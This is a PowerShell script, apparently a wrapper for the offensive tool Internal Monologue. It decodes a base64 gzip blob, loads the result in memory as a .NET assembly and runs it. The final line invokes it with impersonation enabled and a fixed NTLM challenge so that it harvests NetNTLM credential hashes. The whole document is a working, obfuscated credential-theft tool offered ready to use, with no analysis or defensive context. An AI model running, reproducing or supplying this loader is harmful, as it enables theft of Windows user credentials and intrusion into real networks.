function Invoke-Internalmonologue
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    if ($Command -eq " "){$command = ""}    
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [InternalMonologue.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
 invoke-InternalMonologue "-Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788"